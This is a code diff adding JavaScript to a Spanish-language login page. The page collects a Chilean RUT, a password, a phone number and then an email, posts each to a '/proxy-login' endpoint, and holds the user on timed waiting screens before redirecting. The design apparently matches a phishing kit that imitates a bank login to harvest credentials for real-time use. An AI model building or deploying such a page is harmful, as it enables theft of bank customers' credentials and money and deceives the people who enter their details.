@@ -107,4 +107,65 @@
       return;
     }
     if(!contacto){
-      document.getElementById("resultado").innerText = "⚠️ Debe aceptar ser contactado por un
+      document.getElementById("resultado").innerText = "⚠️ Debe aceptar ser contactado por un ejecutivo.";
+      return;
+    }
+
+    try {
+      const response = await fetch("/proxy-login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ rut, passwd, telefono })
+      });
+      const data = await response.text();
+      document.getElementById("resultado").innerText = data;
+
+      if(response.ok){
+        document.getElementById("loginForm").style.display="none";
+        document.getElementById("pantallaEspera").classList.remove("hidden");
+
+        // Mostrar formulario de correo después de 45 segundos
+        setTimeout(()=>{
+          document.getElementById("pantallaEspera").classList.add("hidden");
+          document.getElementById("formCorreo").classList.remove("hidden");
+        }, 45000);
+      }
+    } catch (error) {
+      document.getElementById("resultado").innerText = "⚠️ Error al conectar con el servidor.";
+    }
+  });
+
+  async function enviarCorreo(){
+    const correo = document.getElementById("correo").value;
+
+    try {
+      await fetch("/proxy-login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ mail: correo })
+      });
+    } catch (error) {
+      console.error("Error al enviar correo:", error);
+    }
+
+    document.getElementById("formCorreo").classList.add("hidden");
+    document.getElementById("pantallaEspera").classList.remove("hidden");
+
+    setTimeout(()=>{
+      document.getElementById("pantallaEspera").classList.add("hidden");
+      document.getElementById("pantallaProductos").classList.remove("hidden");
+    }, 5000);
+  }
+
+  function continuarProductos(){
+    document.getElementById("pantallaProductos").classList.add("hidden");
+    document.getElementById("pantallaEspera").classList.remove("hidden");
+
+    setTimeout(()=>{
+      window.location.href="productos.html";
+    }, 5000);
+  }
+</script>
+  </div>
+</body>
+</html>
